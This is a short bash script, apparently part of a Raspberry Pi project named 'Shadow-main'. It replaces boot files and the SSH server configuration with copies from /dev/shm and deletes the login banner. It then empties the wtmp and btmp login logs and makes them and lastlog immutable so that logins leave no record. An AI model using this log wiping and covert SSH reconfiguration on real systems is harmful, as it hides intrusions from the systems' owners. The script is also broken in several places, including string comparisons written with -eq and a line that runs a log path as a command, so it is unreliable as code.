file=cmdline.txt
path1="/dev/shm/Shadow-main"
path2="/boot"
file1=$path1/$file
file2=$path2/$file

size1=$(stat -c %s "$file1")
size2=$(stat -c %s "$file2")


if [ ! "/dev/shm/Shadow-main/cmdline.txt" -eq "/boot/cmdline.txt" ]; then
    sudo rm "/boot/cmdline.txt"
    sudo cp "/dev/shm/Shadow-main/cmdline.txt" "/boot"
fi

if [ ! "/dev/shm/Shadow-main/config.txt" -eq "/boot/config.txt" ]; then
    sudo rm "/boot/config.txt"
    sudo cp "/dev/shm/Shadow-main/config.txt" "/boot"
fi

if [ ! "/dev/shm/Shadow-main/ssh_config" -eq "/etc/ssh/sshd_config" ]; then
    sudo rm /etc/motd    

    sudo rm "/etc/ssh/sshd_config"
    sudo cp "/dev/shm/Shadow-main/sshd_config" "/etc/ssh"
   
    sudo touch /home/pi/.hushlogin
    sudo var/log/lastlog
    sudo chattr +i /var/log/lastlog
    >/var/log/wtmp
    >/var/log/btmp
    sudo chattr +i /var/log/wtmp /var/log/btmp

    sudo reboot
fi
